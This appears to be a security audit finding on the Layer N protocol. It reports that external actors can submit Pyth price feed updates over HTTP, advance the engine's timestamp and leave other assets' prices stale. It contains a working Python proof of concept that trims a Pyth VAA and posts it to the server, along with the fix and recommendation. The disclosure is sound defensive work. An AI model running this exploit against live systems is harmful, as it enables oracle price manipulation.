---
tags:
  - lang/rust
  - platform/cantina
  - has/poc
  - severity/high
  - sector/oracle
protocol: "[[Layer N]]"
auditors:
  - "[[zigtur]]"
report: "https://cdn.cantina.xyz/reports/cantina_layern_august2024.pdf"
genome:
  - "[[spot-price]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[oracle-freshness]]"
  - "[[oracle-manipulation-resistance]]"
  - "[[pyth-oracle-completeness]]"
---
# External actor can submit PythPriceFeedUpdate messages through HTTP server 

- id: 53998
- impact: HIGH
- protocol: [[Layer N]]
- reporter: zigtur (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_layern_august2024.pdf

## Summary


The PythPriceFeedUpdate vulnerability allows anyone to update the current value of a price feed through HTTP requests, which can be used to manipulate the timestamp and block price updates for other assets. A proof of concept has been provided and a recommendation has been made to only allow the Oracle thread to submit these updates. The bug has been fixed in PR 1032 and Cantina Managed has also implemented a fix by denying external actors from submitting these messages and sending price updates directly to the execution channel.

## Details

## PythPriceFeedUpdate Vulnerability

## Context
- `engine.rs` lines 408-411
- `auth.rs` lines 61-77

## Description
The `PythPriceFeedUpdate` message is used to update the current value of a price feed. A dedicated thread is started (see `oracle.rs`) and retrieves feed prices every 500ms to send them to the engine. However, `PythPriceFeedUpdate` messages can also be submitted through HTTP requests. This means that anyone can force a price update.

Since the timestamp for the engine is set by the Pyth price update and anyone can submit these updates, they can force the timestamp to update. And since the timestamp is used to reject older price updates, a malicious actor could submit price updates for a single asset that effectively blocks the price updates for other assets.

For example, a user could continuously request price updates for a single, small-cap asset, receive the message from Pyth, and supply it to the HTTP endpoint. Occasionally, they would get updates that have higher timestamps than whatever the Oracle thread has ready. Thus, the price updates from the Oracle thread would be rejected, leaving the prices for all except one (small-cap) asset stale. Since the attacker's payloads would be smaller (a single asset vs. however many assets Nord supports and thus requests updates for), the payload would decode and process faster than the updates from the Oracle thread, making this timing attack more likely.

## Proof of Concept
At the root of the repository, execute the following:

1. Create exploit directory and copy the proto file:
   ```bash
   mkdir exploit && cp engine/nord.proto exploit/nord.proto && cd exploit
   ```
2. Create a Python environment:
   ```bash
   python3 -m venv localenv && source localenv/bin/activate && pip install protobuf requests
   ```
3. Compile the proto file:
   ```bash
   protoc --python_out=. nord.proto
   ```
4. Copy the following Python exploit in `exploit/exploit.py`:
   ```python
   import nord_pb2  # Import the generated module
   import requests
   from google.protobuf.internal.encoder import _VarintBytes
   import base64, json

   def encode_pythfeed_message(data):
       # Create an instance of the Action message
       action = nord_pb2.Action()
       # Populate the message with the Deposit action
       update = action.pyth_price_feed_update
       update.raw_pythnet_data = data
       action.current_timestamp = 0
       # Encode the message to a binary format
       action_data = action.SerializeToString()
       # Prefix the message with a varint representing the length (for length-delimited messages)
       action_length_prefix = _VarintBytes(len(action_data))
       # Combine the length prefix and the message data
       encoded_data = action_length_prefix + action_data
       return encoded_data

   def send_post_request(base_url, encoded_data):
       url = base_url + "action"  # Replace with your server URL
       headers = {'Content-Type': 'application/x-protobuf'}
       try:
           response = requests.post(url, data=encoded_data, headers=headers)
           if response.status_code == 200:
               if response.content == b'\x02\x08\x03':
                   print("Fail due to bad signature, retry")
               else:
                   print(response.content)
                   print("Request successful!")
           else:
               print(f"Request failed with status code: {response.status_code}")
       except:
           print("Remote server crashed")

   def reduce_vaa(data):
       number_of_sig = data[15]
       print("number of sig", number_of_sig)
       # Remove 12 signatures from 13 signatures
       end_of_sigs = 16 + number_of_sig * 66
       vaa_len = data[8] * 256 + data[9]  # get the size in integer format
       new_vaa_len = vaa_len - (number_of_sig - 1) * 66  # reduce the size for deleted signatures
       # format new data
       new_data = data[0:8] + new_vaa_len.to_bytes(2, "big") + data[10:15] + b"\x01" + data[16:16 + 66] + data[end_of_sigs:]
       return new_data

   if __name__ == "__main__":
       base_url = "http://127.0.0.1:3000/"
       try:
           resp = requests.get("https://hermes.pyth.network/api/latest_vaas?ids[]=ff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace")  # ETH/USD Pyth Feed
       except:
           print("Error while getting pyth feed")
       pyth_data = json.loads(resp.content)  # response from pyth
       data = base64.b64decode(pyth_data[0])
       # The nord server limits HTTP request to 1024 bytes
       if len(data) > 1024:
           data = reduce_vaa(data)
       encoded_data = encode_pythfeed_message(data)
       send_post_request(base_url, encoded_data)
   ```
5. Then, run the following command:
   ```bash
   python3 exploit.py
   ```
   The PriceFeed update will be accepted by the nord server.

## Recommendation
Only the Oracle thread should be able to submit `PythPriceFeedUpdate` messages. `PythPriceFeedUpdate` messages coming from the HTTP server should be ignored.

## LayerN
Fixed in PR 1032.

## Cantina Managed
Fixed. The authentication threads deny the processing of price update messages. This denies external actors from submitting `PythPriceFeedUpdate` messages. The Oracle thread now sends the price updates directly to the execution channel instead of the authentication channel.
